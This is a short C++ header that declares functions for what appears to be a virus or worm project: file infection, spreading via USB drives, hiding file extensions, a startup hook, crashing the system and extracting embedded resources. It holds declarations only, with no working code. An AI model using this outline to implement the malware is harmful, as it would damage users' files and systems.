#pragma once

#include<vector>
#include<string>
#include<filesystem>
using namespace std;
using namespace std::experimental::filesystem;

class Crashed
{
public:
	Crashed();
	~Crashed();
};

void Infect();
void Infect_U();
void Infect_Computer();
void Infect_File(string & file);
void Hide_File_Ext();
void Get_U_Disk(string & U_Path);
void FileSearch(string DirPath, vector<string>& FileList);
void Crash();
void FuckStart();
void BGM_Player();
bool ExtractResource(char * strDstFile, char * strResType, char * strResName);